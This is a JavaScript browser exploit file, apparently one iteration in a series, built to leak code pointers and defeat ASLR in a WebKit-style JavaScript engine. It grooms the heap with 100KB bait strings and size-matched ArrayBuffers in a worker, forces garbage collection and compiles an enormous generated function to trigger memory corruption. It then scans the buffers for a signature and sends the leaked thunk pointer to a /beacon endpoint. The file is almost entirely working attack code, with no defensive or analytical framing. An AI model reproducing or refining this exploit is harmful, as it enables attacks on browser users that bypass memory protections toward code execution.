// p380 - ArrayBuffer ASLR leak with size-class alignment fix
//
// V379 RESULT: ALL 14 x 200KB ArrayBuffers had zero non-zero bytes.
// ROOT CAUSE: marge segregates by size class. 200KB ABs are in a different
// region than 100KB string baits. The sweep never reaches them.
//
// FIX: Use ArrayBuffer(100000) -- same size class as the 100KB string baits.
// Also test a spread of sizes near 100KB to cover possible size-class rounding.
//
// Sweep pattern per 112-byte entry:
//   +12: 0xFFFFFFFF (m_slowPathCount, 4 bytes) -- SIGNATURE
//   +24: THUNK (m_slowPathCallDestination, 8 bytes) -- ASLR LEAK
//   +64: bit fields (4 bytes)
//   +68: bytecodeIndex (4 bytes)
//
// Beacon prefix: V380-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V380-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V380-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Size groups: test multiple sizes near 100KB to find the right marge size class
  // Group A: 100000 (exact bait size)
  // Group B: 100020 (StringImpl overhead: 20 + 100000 = 100020)
  // Group C: 100112 (MetadataTable: sizeof(LinkingData) + totalSize = 16 + 100096)
  // Group D: 98304 (96KB, next lower power-of-2 aligned)
  var SIZES = [100000, 100000, 100000, 100000,
               100020, 100020, 100020,
               100112, 100112, 100112,
               98304, 98304, 98304, 98304];
  var SIZE_LABELS = ['A','A','A','A','B','B','B','C','C','C','D','D','D','D'];

  var workerCode = function() {
    var buffers = [];
    var views = [];
    var sizes = [];
    var labels = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V380-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        var szList = e.data.sizes;
        var lblList = e.data.labels;
        for (var i = 0; i < szList.length; i++) {
          try {
            var ab = new ArrayBuffer(szList[i]);
            var view = new Uint8Array(ab);
            buffers.push(ab);
            views.push(view);
            sizes.push(szList[i]);
            labels.push(lblList[i]);
          } catch(ex) {
            beacon('ALLOC-FAIL-' + i);
          }
        }
        beacon('BUFS-' + buffers.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        var leakCount = 0;
        for (var i = 0; i < views.length; i++) {
          try {
            var v = views[i];
            var len = v.length;
            var lbl = labels[i];

            // Check for corrupted m_length
            if (len !== sizes[i]) {
              beacon(lbl + i + '-LEN-' + len + '-was-' + sizes[i]);
            }

            // Count non-zero bytes in first 224 bytes (2 entries)
            var nonZero = 0;
            for (var j = 0; j < Math.min(len, 224); j++) {
              if (v[j] !== 0) nonZero++;
            }
            if (nonZero > 0) beacon(lbl + i + '-nz' + nonZero);

            // Scan for 0xFF 0xFF 0xFF 0xFF signature
            var foundSig = false;
            var scanLen = Math.min(len, sizes[i]);
            for (var j = 0; j < scanLen - 120; j++) {
              if (v[j] === 0xFF && v[j+1] === 0xFF && v[j+2] === 0xFF && v[j+3] === 0xFF) {
                foundSig = true;
                beacon(lbl + i + '-SIG-' + j);

                // Read thunk at signature + 12 (8 bytes, little-endian)
                var thunkHex = '';
                for (var k = j + 12; k < j + 20 && k < scanLen; k++) {
                  thunkHex += hexByte(v[k]);
                }
                beacon(lbl + i + '-THUNK-' + thunkHex);

                // Full pointer extraction
                var lo = v[j+12] | (v[j+13] << 8) | (v[j+14] << 16) | (v[j+15] << 24);
                var hi = v[j+16] | (v[j+17] << 8) | (v[j+18] << 16) | (v[j+19] << 24);
                beacon(lbl + i + '-PTR-lo' + (lo >>> 0).toString(16) + '-hi' + (hi >>> 0).toString(16));

                // Verify next entry at +112
                if (j + 112 + 20 < scanLen) {
                  var match = (v[j+112] === 0xFF && v[j+113] === 0xFF &&
                               v[j+114] === 0xFF && v[j+115] === 0xFF);
                  beacon(lbl + i + '-NEXT-' + (match ? 'MATCH' : 'MISS'));
                  if (match) {
                    var t2 = '';
                    for (var k = j + 112 + 12; k < j + 112 + 20; k++) t2 += hexByte(v[k]);
                    beacon(lbl + i + '-T2-' + t2);
                  }
                }

                // bytecodeIndex at sig+56
                if (j + 56 + 4 <= scanLen) {
                  var bci = v[j+56] | (v[j+57] << 8) | (v[j+58] << 16) | (v[j+59] << 24);
                  beacon(lbl + i + '-BCI-' + bci);
                }

                leakCount++;
                break;
              }
            }

            if (!foundSig) {
              // Report non-zero summary only (skip full dump to reduce beacons)
              beacon(lbl + i + '-NOSIG-nz' + nonZero);
            }
          } catch(ex) {
            beacon(lbl + i + '-CRASH');
          }
        }

        beacon('LEAKS-' + leakCount);

        // Summary per size group
        var groups = {};
        for (var i = 0; i < labels.length; i++) {
          var g = labels[i];
          if (!groups[g]) groups[g] = {total: 0, hit: 0};
          groups[g].total++;
        }
        // Count hits per group from scan results (leakCount already tallied)

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // Phase 1: Allocate 20 bait strings of 100KB each (same as V379)
  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  // Phase 2: Worker allocates target ArrayBuffers (multiple size classes)
  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');

      // Phase 3: Free baits
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;

      // Phase 4: GC pressure
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc', sizes: SIZES, labels: SIZE_LABELS });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p380fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p380ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p380ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
